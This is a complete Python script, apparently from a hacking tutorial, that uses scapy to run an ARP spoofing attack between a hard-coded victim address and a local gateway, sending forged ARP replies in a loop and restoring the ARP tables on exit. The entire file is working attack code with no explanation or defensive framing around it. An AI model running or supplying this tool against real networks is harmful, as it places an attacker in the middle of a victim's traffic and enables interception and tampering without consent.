#!/usr/bin/python 

import scapy.all as scapy
import time
import sys

def get_mac(ip):
	arp_request = scapy.ARP(pdst = ip) 
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False) [0]

	return answered_list[0][1].hwsrc	

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	# scapy.ls(scapy.ARP) 
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) 

	#packet.show()
	#packet.summary()
	scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
	dest_mac = get_mac(dest_ip)
	src_mac = get_mac(src_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac) 
	scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.0.7"
gateway_ip = "192.168.0.1"


sent_packet_count = 0
try:
	while True:
		spoof(gateway_ip, target_ip)
		spoof(target_ip, gateway_ip)
		sent_packet_count = sent_packet_count + 2
		print("\r[+] Packet sent: " + str(sent_packet_count)),
		sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt:
	print("[+] Detected CTRL + C.....Resetting ARP Tables....Please wait.\n")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)


#	
